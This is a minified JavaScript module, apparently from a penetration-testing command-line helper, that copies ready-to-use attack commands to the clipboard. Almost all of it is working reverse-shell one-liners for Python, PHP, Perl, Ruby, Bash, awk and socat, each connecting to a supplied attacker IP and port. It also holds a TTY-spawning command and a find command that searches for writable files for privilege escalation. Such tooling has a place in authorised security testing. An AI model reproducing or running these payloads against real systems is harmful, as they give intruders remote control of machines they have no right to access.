"use strict";var _interopRequireDefault=require("@babel/runtime/helpers/interopRequireDefault");require("core-js/modules/es.string.replace"),Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _asyncToGenerator2=_interopRequireDefault(require("@babel/runtime/helpers/asyncToGenerator")),_clipboardy=_interopRequireDefault(require("clipboardy"));const wrapWithQuotes=a=>`"${a.replace(/"/g,"\\\"")}"`;var _default={/* eslint-disable max-len */"reverse shell (python)":[{text:"Copy Python reverse shell to clipboard",task:function(){var a=(0,_asyncToGenerator2.default)(function*({escaped:a,ip:b,port:c}){const d=`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${b}",${c}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`;yield _clipboardy.default.write(a?wrapWithQuotes(d):d)});return function task(){return a.apply(this,arguments)}}(),condition:()=>!0}],"reverse shell (php)":[{text:"Copy PHP reverse shell to clipboard",task:function(){var a=(0,_asyncToGenerator2.default)(function*({escaped:a,ip:b,port:c}){const d=`php -r '$sock=fsockopen("${b}",${c});exec("/bin/sh -i <&3 >&3 2>&3");'`;yield _clipboardy.default.write(a?wrapWithQuotes(d):d)});return function task(){return a.apply(this,arguments)}}(),condition:()=>!0}],"reverse shell (perl)":[{text:"Copy Perl reverse shell to clipboard",task:function(){var a=(0,_asyncToGenerator2.default)(function*({escaped:a,ip:b,port:c}){const d=`perl -e 'use Socket;$i="${b}";$p=${c};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;yield _clipboardy.default.write(a?wrapWithQuotes(d):d)});return function task(){return a.apply(this,arguments)}}(),condition:()=>!0}],"reverse shell (ruby)":[{text:"Copy Ruby reverse shell to clipboard",task:function(){var a=(0,_asyncToGenerator2.default)(function*({escaped:a,ip:b,port:c}){const d=`ruby -rsocket -e'f=TCPSocket.open("${b}",${c}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`;yield _clipboardy.default.write(a?wrapWithQuotes(d):d)});return function task(){return a.apply(this,arguments)}}(),condition:()=>!0}],"reverse shell (bash)":[{text:"Copy Bash reverse shell to clipboard",task:function(){var a=(0,_asyncToGenerator2.default)(function*({escaped:a,ip:b,port:c}){const d=`bash -i >& /dev/tcp/${b}/${c} 0>&1`;yield _clipboardy.default.write(a?wrapWithQuotes(d):d)});return function task(){return a.apply(this,arguments)}}(),condition:()=>!0}],"reverse shell (awk)":[{text:"Copy awk reverse shell to clipboard",task:function(){var a=(0,_asyncToGenerator2.default)(function*({escaped:a,ip:b,port:c}){const d=`awk 'BEGIN {s = "/inet/tcp/0/${b}/${c}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`;yield _clipboardy.default.write(a?wrapWithQuotes(d):d)});return function task(){return a.apply(this,arguments)}}(),condition:()=>!0}],"reverse shell (socat)":[{text:"Copy command to clipboard",task:function(){var a=(0,_asyncToGenerator2.default)(function*({escaped:a,ip:b,port:c}){const d=`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${b}:${c}`;yield _clipboardy.default.write(a?wrapWithQuotes(d):d)});return function task(){return a.apply(this,arguments)}}(),condition:()=>!0}],"spawn a TTY shell (python)":[{text:"Copy command to clipboard",task:function(){var a=(0,_asyncToGenerator2.default)(function*({escaped:a}){yield _clipboardy.default.write(a?wrapWithQuotes("python -c 'import pty;pty.spawn(\"/bin/bash\")'"):"python -c 'import pty;pty.spawn(\"/bin/bash\")'")});return function task(){return a.apply(this,arguments)}}(),condition:()=>!0}],"find files/folders with write access (linux)":[{text:"Copy command to clipboard",task:function(){var a=(0,_asyncToGenerator2.default)(function*({escaped:a,user:b,group:c}){const d=`find / -path /proc -prune -o '(' -type f -or -type d ')' '(' '(' -user ${b} -perm -u=w ')' -or '(' -group ${c} -perm -g=w ')' -or '(' -perm -o=w ')' ')' -print 2> /dev/null`;yield _clipboardy.default.write(a?wrapWithQuotes(d):d)});return function task(){return a.apply(this,arguments)}}(),condition:()=>!0}]};/* eslint-enable max-len */exports.default=_default;